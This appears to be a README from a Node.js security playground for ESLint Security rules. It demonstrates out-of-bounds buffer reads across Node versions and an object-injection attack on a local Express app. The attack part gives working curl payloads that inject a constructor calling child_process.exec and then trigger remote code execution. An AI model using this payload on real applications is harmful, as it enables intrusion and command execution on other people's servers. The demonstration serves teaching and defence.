# Playground ESLint Security


## detect-buffer-noassert 

* Try with node.js 6

```console
$ sudo docker container run --rm -it \
  --volume $(pwd):/home/node/ \
  -w /home/node/ \
  node:6-alpine node /home/node/detect-buffer-noassert.js
```

```console
Create a new buffer (16 octects / 2 bytes)
<Buffer 68 ba>
Read data from the buffer (16 octects / 2 bytes):
57005
Read more bytes than buffer size (4 bytes / 32 octets):
3735879680
Read beyond the buffer size (2 bytes with offset = 2 bytes):
0
```

Conclusion: the memory allocated for Buffer instances is not initialized 

* Try with node.js 8

```console
$ sudo docker container run --rm -it \
  --volume $(pwd):/home/node/ \
  -w /home/node/ \
  node:8-alpine node /home/node/detect-buffer-noassert.js
```

```console
Create a new buffer (16 octects / 2 bytes)
<Buffer 00 00>
Read data from the buffer (16 octects / 2 bytes):
57005
Read more bytes than buffer size (4 bytes / 32 octets):
3735879680
Read beyond the buffer size (2 bytes with offset = 2 bytes):
0
```

Conclusion: node.js can read data beyond the end of the buffer

* Try with node.js 10

```console
$ sudo docker container run --rm -it \
  --volume $(pwd):/home/node/ \
  -w /home/node/ \
  node:10-alpine node /home/node/detect-buffer-noassert.js
```

```console
throw new ERR_BUFFER_OUT_OF_BOUNDS();
```



## detect-object-injection

A prototype to demonstrate the dangers of square bracket notation using object injection attack. It is inspired by this [article](https://github.com/nodesecurity/eslint-plugin-security/blob/master/docs/the-dangers-of-square-bracket-notation.md) from ESLint Security. This article was originally written by Jon Lamendola for [^Lift Security](https://web.archive.org/web/20150430062816/https://blog.liftsecurity.io/2015/01/15/the-dangers-of-square-bracket-notation).

### Step 0: getting started

* Install nodejs

* clone repository

```console
$ git clone https://github.com/0xdbe/express-object-injection.git
$ cd express-object-injection
```

* Install express

```console
$ npm install
```
* Start application

```console
$ node detect-object-injection-2.js
```

### Step 1: setting a malicious fuction as constructor

```console
$ curl http://localhost:3000/api/user \
    -H 'Content-Type: application/json' \
    --data '["constructor", "var require = global.require || global.process.mainModule.constructor._load;require(\"child_process\").exec(arguments[0], console.log)"]'
```

This request allow to add the following method in user object:

```javascript
var user = {

  //...

  constructor = function(){
    var require = global.require || global.process.mainModule.constructor._load;
    require(\"child_process\").exec(arguments[0], console.log)"]';
  }

};
```

### Step 3: call the malicious function allowing a remote code execute (RCE)

```console
$ curl http://localhost:3000/api/user \
  -H 'Content-Type: application/json' \
  --data '["anyVal", "date"]'
```

This request allows to execute :

```javascript
var require = global.require || global.process.mainModule.constructor._load;
require(\"child_process\").exec(date, console.log);
```
